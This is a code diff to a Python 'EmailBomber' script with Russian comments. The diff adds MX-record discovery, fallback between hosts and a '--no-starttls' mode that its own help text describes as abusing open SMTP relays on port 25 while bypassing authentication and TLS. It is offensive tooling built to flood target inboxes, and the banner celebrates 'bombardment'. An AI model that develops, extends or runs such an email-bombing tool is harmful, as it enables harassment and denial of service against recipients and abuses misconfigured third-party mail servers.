@@ -9,6 +9,8 @@ import smtplib
 import time
 import argparse
 import sys
+import re
+import subprocess
 import mimetypes
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -61,49 +63,140 @@ def _parse_smtp_addr(server_str, port_override=None):
     return host, port
 
 
+def _looks_like_ip(host):
+    if host.startswith('['):
+        return True
+    if ':' in host and '.' not in host:
+        return True  # IPv6 без скобок маловероятно, но пусть
+    parts = host.split('.')
+    if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
+        return True
+    return False
+
+
+def _mx_hosts(domain):
+    """Имена MX для домена (по приоритету). Пусто, если dig недоступен."""
+    try:
+        r = subprocess.run(
+            ['dig', '+short', 'MX', domain],
+            capture_output=True,
+            text=True,
+            timeout=8,
+        )
+        if r.returncode != 0 or not (r.stdout or '').strip():
+            return []
+        records = []
+        for line in (r.stdout or '').splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            m = re.match(r'(\d+)\s+(\S+)', line)
+            if not m:
+                continue
+            records.append((int(m.group(1)), m.group(2).rstrip('.')))
+        records.sort(key=lambda x: x[0])
+        return [name for _, name in records]
+    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
+        return []
+
+
+def _smtp_host_candidates(host):
+    """Куда пробовать SMTP: как указал пользователь, затем MX и mail.<домен>."""
+    host = host.strip().rstrip('.')
+    if _looks_like_ip(host):
+        return [host]
+    candidates = [host]
+    for mx in _mx_hosts(host):
+        if mx not in candidates:
+            candidates.append(mx)
+    if not host.startswith('mail.'):
+        mail_guess = f'mail.{host}'
+        if mail_guess not in candidates:
+            candidates.append(mail_guess)
+    return candidates
+
+
+def _connect_refused(exc):
+    if isinstance(exc, ConnectionRefusedError):
+        return True
+    if isinstance(exc, OSError) and getattr(exc, 'errno', None) in (111, 61):
+        return True
+    msg = str(exc).lower()
+    return 'connection refused' in msg or 'errno 111' in msg
+
+
 class EmailBomber:
-    def __init__(self, smtp_server, smtp_user, smtp_password, mail_from, port=None):
+    def __init__(self, smtp_server, smtp_user, smtp_password, mail_from, port=None, starttls_mode='auto'):
         self.smtp_server = smtp_server
         self.smtp_user = smtp_user or ''
         self.smtp_password = smtp_password or ''
         self.mail_from = mail_from
         self.port_override = port
+        # starttls_mode: 'auto' | 'on' | 'off'
+        self.starttls_mode = starttls_mode
         self.smtp_connection = None
+        self.connected_host = None
+
+    def _apply_starttls(self, port):
+        """STARTTLS по режиму. Порт 25 по умолчанию plain (как swaks без --tls) — многие open-relay мисконфиги ломаются после апгрейда."""
+        mode = self.starttls_mode
+        if mode == 'off':
+            print("[~] STARTTLS отключён (--no-starttls / open-relay режим)")
+            return
+        if mode == 'on':
+            self.smtp_connection.starttls()
+            print("[+] STARTTLS применён (--starttls)")
+            return
+        # auto: 587 — с STARTTLS; 25 и прочие — plain без апгрейда
+        if port == 587:
+            self.smtp_connection.starttls()
+            print("[+] STARTTLS применён (порт 587, auto)")
+        else:
+            print("[~] Plain SMTP без STARTTLS (порт {}, как swaks на :25)".format(port))
         
+    def _open_smtp(self, host, port):
+        if port == 465:
+            self.smtp_connection = smtplib.SMTP_SSL(host, port, timeout=30)
+            print("[+] SSL-соединение установлено (порт 465)")
+        else:
+            self.smtp_connection = smtplib.SMTP(host, port, timeout=30)
+            self._apply_starttls(port)
+
     def connect(self):
-        """Коннектимся к SMTP. Поддержка: порт 465 (SSL), 587 (STARTTLS), 25 (plain/STARTTLS)."""
-        try:
-            host, port = _parse_smtp_addr(self.smtp_server, self.port_override)
-            print(f"[+] Подключаемся к {host}:{port}...")
-            
-            if port == 465:
-                # Implicit TLS (SMTPS)
-                self.smtp_connection = smtplib.SMTP_SSL(host, port, timeout=30)
-                print("[+] SSL-соединение установлено (порт 465)")
-            else:
-                self.smtp_connection = smtplib.SMTP(host, port, timeout=30)
-                # STARTTLS для 587, для 25 пробуем (некоторые релеи не умеют)
-                if port == 587:
-                    self.smtp_connection.starttls()
-                    print("[+] STARTTLS применён (порт 587)")
+        """Коннектимся к SMTP. Порт 465 (SSL), 587 (STARTTLS), 25 (plain open-relay по умолчанию)."""
+        host, port = _parse_smtp_addr(self.smtp_server, self.port_override)
+        candidates = _smtp_host_candidates(host)
+        if len(candidates) > 1:
+            print(f"[~] Варианты SMTP-хоста: {', '.join(candidates)}")
+
+        last_error = None
+        for idx, try_host in enumerate(candidates):
+            if idx:
+                print(f"[~] {candidates[idx - 1]}:{port} — {last_error}, пробуем {try_host}...")
+            print(f"[+] Подключаемся к {try_host}:{port}...")
+            try:
+                self._open_smtp(try_host, port)
+                if self.smtp_user and self.smtp_password:
+                    self.smtp_connection.login(self.smtp_user, self.smtp_password)
+                    print("[+] Аутентификация выполнена")
                 else:
-                    try:
-                        self.smtp_connection.starttls()
-                        print("[+] STARTTLS применён")
-                    except (smtplib.SMTPNotSupportedError, smtplib.SMTPException):
-                        print("[~] STARTTLS недоступен, продолжаем без шифрования")
-            
-            if self.smtp_user and self.smtp_password:
-                self.smtp_connection.login(self.smtp_user, self.smtp_password)
-                print("[+] Аутентификация выполнена")
-            else:
-                print("[~] Без аутентификации (relay/open server)")
-            
-            print("[+] SMTP подключение установлено! Готовы к бомбардировке 💣")
-            return True
-        except Exception as e:
-            print(f"[!] Ошибка подключения к SMTP: {e}")
-            return False
+                    print("[~] Без аутентификации (relay/open server)")
+
+                self.connected_host = try_host
+                if try_host != host:
+                    print(f"[+] Используем SMTP-хост {try_host} (в -s был {host})")
+                print("[+] SMTP подключение установлено! Готовы к бомбардировке 💣")
+                return True
+            except Exception as e:
+                last_error = e
+                self.smtp_connection = None
+                if _connect_refused(e) and idx < len(candidates) - 1:
+                    continue
+                print(f"[!] Ошибка подключения к SMTP: {e}")
+                if len(candidates) > 1:
+                    print("[!] На apex-домене часто нет порта 25 — проверь: dig +short MX <домен>")
+                return False
+        return False
 
     def reconnect(self):
         print("[~] Переподключаемся к SMTP серверу...")
@@ -212,6 +305,10 @@ def main():
     parser.add_argument('-d', '--delay', type=int, required=True, help="Задержка между отправками (секунды)")
     parser.add_argument('-s', '--smtp-server', required=True, help="SMTP сервер (host или host:port, напр. exchange.local:465)")
     parser.add_argument('--port', type=int, default=None, help="Порт SMTP (если не указан в -s). 465=SSL, 587=STARTTLS, 25=plain")
+    tls_group = parser.add_mutually_exclusive_group()
+    tls_group.add_argument('--starttls', action='store_true', help="Принудительно STARTTLS (на :25 если сервер требует TLS)")
+    tls_group.add_argument('--no-starttls', action='store_true',
+                           help="Без STARTTLS: open-relay на :25 как swaks без --tls (минуя AUTH/TLS)")
     parser.add_argument('-u', '--user', default='', help="SMTP логин (опусти для relay без auth)")
     parser.add_argument('-p', '--password', default='', help="SMTP пароль")
     parser.add_argument('-f', '--mail-from', required=True, help="Email отправителя")
@@ -249,8 +346,17 @@ def main():
         print("[!] Не удалось загрузить HTML шаблон")
         sys.exit(1)
     
-    # Создаем бомбер
-    bomber = EmailBomber(args.smtp_server, args.user, args.password, args.mail_from, args.port)
+    if args.starttls:
+        starttls_mode = 'on'
+    elif args.no_starttls:
+        starttls_mode = 'off'
+    else:
+        starttls_mode = 'auto'
+
+    bomber = EmailBomber(
+        args.smtp_server, args.user, args.password, args.mail_from, args.port,
+        starttls_mode=starttls_mode,
+    )
     
     if not bomber.connect():
         sys.exit(1)
@@ -286,8 +392,8 @@ def main():
     ╔═══════════════════════════════════════╗
     ║           ИТОГИ РАССЫЛКИ              ║
     ║  Отправлено успешно: {sent_count:<15} ║
-    ║  Ошибок отправки: {failed_count:<18} ║
-    ║  "Keep-alive for the win, чувак!"    ║
+    ║  Ошибок отправки: {failed_count:<18}  ║
+    ║  "Keep-alive for the win, чувак!"     ║
     ╚═══════════════════════════════════════╝
     """)
 
